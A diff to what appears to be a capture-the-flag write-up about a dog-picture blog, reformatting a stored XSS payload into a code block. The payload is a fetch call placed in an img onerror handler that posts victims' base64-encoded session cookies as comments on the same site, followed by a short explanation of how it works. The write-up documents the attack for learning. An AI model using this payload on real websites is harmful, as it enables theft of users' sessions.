@@ -134,7 +134,9 @@ The website hosted on `https://dogshare.com` is a blog where users can share pic
 
 After achieving XSS we need to modify the payload of the stored XSS, to post the cookie of the other users. This is done by changing the code in the onerror part of the img tag to the following:
 
-`fetch("/comments", {method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: "did=1&comment=" + btoa(document.cookie)})`
+```js
+fetch("/comments", {method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: "did=1&comment=" + btoa(document.cookie)})
+```
 
 Here the fetch JS function is used to post a comment to the dogshare website, including the document.cookie (a users cookie) encoded as base64. The `did=1` part of the form, is specifying which post to comment on.
 
